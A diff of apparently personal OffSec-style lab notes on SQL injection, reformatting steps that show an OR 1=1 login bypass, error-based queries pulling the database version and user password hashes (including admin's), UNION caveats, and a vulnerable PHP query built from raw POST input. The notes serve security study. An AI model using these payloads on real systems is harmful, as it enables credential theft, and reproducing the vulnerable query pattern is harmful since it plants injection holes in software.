@@ -1561,38 +1561,45 @@ uname= `offsec' OR 1=1 -- //`
 ```
 SELECT * FROM users WHERE user_name= 'offsec' OR 1=1 --
 ```
-append a single quote to the username
+1. Append a single quote to the username.
 ![image](https://hackmd.io/_uploads/B1NEBE4Q1l.png)
-> SQL syntax error this time, meaning we can interact with the database.
+    > SQL syntax error this time, meaning we can interact with the database.
 
-```
-offsec' OR 1=1 -- //
-```
-![image](https://hackmd.io/_uploads/Bknx844Xkl.png)
-> received an Authentication Successful message, meaning that our attack succeeded
+    ```
+    offsec' OR 1=1 -- //
+    ```
+    ![image](https://hackmd.io/_uploads/Bknx844Xkl.png)
+    > received an Authentication Successful message, meaning that our attack succeeded
 
-```
-' or 1=1 in (select @@version) -- //
-```          
-![image](https://hackmd.io/_uploads/ryxGc4VQkg.png)
-> This means that we should **only query one column at a time**.
+2. Check version
+    ```
+    ' or 1=1 in (select @@version) -- //
+    ```          
+    ![image](https://hackmd.io/_uploads/ryxGc4VQkg.png)
+    > This means that we should **only query one column at a time**.
 
-Let's grab only the password column
-```
-' or 1=1 in (SELECT password FROM users) -- //
-```
-![image](https://hackmd.io/_uploads/BJb_q4VXJe.png)
-> 1. retrieve all user password hashes
-> 2. But don't know which user each password hash corresponds to
-> 3. solve the issue by adding a WHERE clause
-
-```
-' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
-```
-![image](https://hackmd.io/_uploads/HJm_2EE7kl.png)
+3. Grab only the password column.
+    ```
+    ' or 1=1 in (SELECT password FROM users) -- //
+    ```
+    ![image](https://hackmd.io/_uploads/BJb_q4VXJe.png)
+    > 1. retrieve all user password hashes
+    > 2. But don't know which user each password hash corresponds to
+    > 3. solve the issue by adding a WHERE clause
+4. WHERE clause
+    ```
+    ' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
+    ```
+    ![image](https://hackmd.io/_uploads/HJm_2EE7kl.png)
 
 #### - UNION-based Payloads
-The UNION keyword aids exploitation because it enables the execution of an extra SELECT statement and provides the results in the same query
+The UNION keyword aids exploitation because it enables the execution of an `extra SELECT statement and provides the results in the same query`.
 >[!Warning]
 > 1. The injected UNION query has to include the same number of columns as the original query.
 > 2. The data types need to be compatible between each column.
+
+Vulnerable SQL Query
+```php
+$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";
+```
+
